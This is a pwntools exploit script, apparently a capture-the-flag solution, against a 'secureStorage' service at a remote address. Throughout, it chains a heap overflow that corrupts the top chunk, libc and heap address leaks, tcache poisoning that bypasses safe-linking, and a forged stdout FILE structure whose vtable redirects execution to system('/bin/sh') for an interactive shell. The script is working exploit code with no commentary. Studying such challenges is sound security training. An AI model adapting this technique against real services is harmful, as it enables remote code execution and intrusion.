#!/usr/bin/env python3

from pwn import *

context.update(arch="amd64", os="linux", log_level="debug")
context.binary = elf = ELF("./secureStorage", checksec=False)
libc = ELF("./libc.so.6", checksec=False)

r = remote("10.10.251.186", 1337)

def add(index, size, content):
    r.sendlineafter(b'\n>> ', b'1')
    r.sendlineafter(b'Enter permit index:\n', str(index).encode())
    r.sendlineafter(b'Enter entry size:\n', str(size).encode())
    r.sendlineafter(b'Enter entry data:\n', content)

def show(index):
    r.sendlineafter(b'\n>> ', b'2')
    r.sendlineafter(b'Enter entry index:\n', str(index).encode())

def edit(index, content):
    r.sendlineafter(b'\n>> ', b'3')
    r.sendlineafter(b'Enter entry index:\n', str(index).encode())
    r.sendlineafter(b'Enter data:\n', content)

add(0, 352, b"A"*8)
edit(0, b"A"*352 + p64(0) + p64(0xc01))
add(1, 0x1000, b"A"*8)
add(2, 64, b"A")
edit(2, b"A"*8)
show(2)
libc_leak = u64(r.recvuntil(b"\n[1]")[-9:-4].ljust(8, b"\x00")) * 256 # to account for overwritten null byte
print(f"[+] Libc Leak: {hex(libc_leak)}")
libc_base = libc_leak - 0x204100
print(f"[+] Libc Base : {hex(libc_base)}")
edit(2, b"A"*16)
show(2)
heap_leak = u64(r.recvuntil(b"\n[1]")[-9:-4].ljust(8, b"\x00")) * 256 # to account for overwritten null byte
print(f"[+] Heap Leak: {hex(heap_leak)}")
heap_base = heap_leak - 0x400
print(f"[+] Heap Base : {hex(heap_base)}")

add(3, 0xd98, b"A"*0xd98 + p64(0x251))
add(4, 0xda8, b"A"*0xda8 + p64(0x251))
add(5, 0x1000, b"A")

libc.address = libc_base
stdout = libc.sym['_IO_2_1_stdout_']
last_addr = heap_base + 0x43dc0
stdout_enc = stdout ^ last_addr >> 12
edit(4, b"A"*0xda8 + p64(0x231) + p64(stdout_enc))

add(6, 0x228, b"A")
add(7, 0x228, b"A")

fake = FileStructure(0)
fake.flags = 0x3b01010101010101
fake._IO_read_end = libc.sym['system']
fake._IO_save_base = libc.address + 0x1724f0  # add rdi, 0x10 ; jmp rcx
fake._IO_write_end = u64(b'/bin/sh'.ljust(8,b'\x00'))
fake._lock = libc.sym['_IO_stdfile_1_lock']
fake._codecvt = stdout + 0xb8
fake._wide_data = stdout + 0x200
fake_vtable = libc.sym['_IO_wfile_jumps'] - 0x18
fake.unknown2 = p64(0)*2 + p64(stdout+0x20) + p64(0)*3 + p64(fake_vtable)

edit(7, bytes(fake))
r.interactive()